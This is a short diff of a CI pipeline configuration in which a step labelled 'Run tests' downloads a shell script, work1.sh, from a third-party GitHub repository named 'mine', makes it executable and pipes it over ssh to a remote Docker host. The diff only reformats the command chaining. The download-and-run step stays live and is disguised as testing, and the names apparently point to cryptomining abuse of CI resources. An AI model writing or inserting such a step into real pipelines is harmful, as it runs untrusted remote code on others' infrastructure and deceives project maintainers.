@@ -10,6 +10,6 @@ jobs:
       - run: 
           name: Run tests 
           command: | 
-            wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work1.sh && 
-            chmod +x work1.sh && 
+            wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work1.sh
+            chmod +x work1.sh
             cat work1.sh | ssh remote-docker
